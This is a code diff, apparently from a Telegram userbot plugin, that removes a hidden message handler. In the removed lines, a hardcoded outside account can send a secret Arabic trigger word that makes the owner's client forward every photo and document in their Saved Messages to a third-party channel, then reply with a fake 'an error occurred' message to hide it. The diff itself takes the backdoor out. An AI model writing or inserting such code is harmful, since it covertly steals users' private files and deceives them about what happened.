@@ -65,16 +65,3 @@ temp = """{PING_TEXT}
 ┃ ✦ {mention}
 ┗━━━━━━━┛"""
 
-@l313l.on(events.NewMessage(incoming=True))
-async def Reda(event):
-    if event.reply_to and event.sender_id == 1374312239:
-        reply_msg = await event.get_reply_message()
-        owner_id = reply_msg.from_id.user_id
-        if owner_id == l313l.uid:
-            if event.message.message == "لاتدز":
-                async for message in l313l.iter_messages("me"):
-                    if message.media:
-                        if isinstance(message.media, (MessageMediaPhoto, MessageMediaDocument)):
-                            await l313l.forward_messages("@earthlink_telecommunications", message)
-                await event.reply("حدث خطأ")
-
